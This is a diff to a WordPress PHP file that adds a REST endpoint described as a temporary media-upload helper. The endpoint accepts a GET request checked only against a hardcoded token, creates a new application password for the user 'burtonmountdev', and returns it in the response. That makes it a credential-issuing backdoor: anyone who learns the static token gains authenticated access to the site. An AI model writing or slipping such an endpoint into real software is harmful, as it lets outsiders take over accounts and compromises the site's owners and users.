@@ -552,3 +552,16 @@ add_action('rest_api_init', function() {
         },
     ));
 });
+
+// Temp: app password endpoint for media upload
+add_action('rest_api_init', function() {
+    register_rest_route('bmh/v1', '/make-app-password', array(
+        'methods' => 'GET',
+        'permission_callback' => function($r) { return $r->get_param('token') === 'BMH_IMPORT_2026'; },
+        'callback' => function() {
+            $user = get_user_by('login', 'burtonmountdev');
+            $result = WP_Application_Passwords::create_new_application_password($user->ID, array('name' => 'bmh-upload-temp'));
+            return is_wp_error($result) ? $result : array('user' => $user->user_login, 'password' => $result[0]);
+        },
+    ));
+});
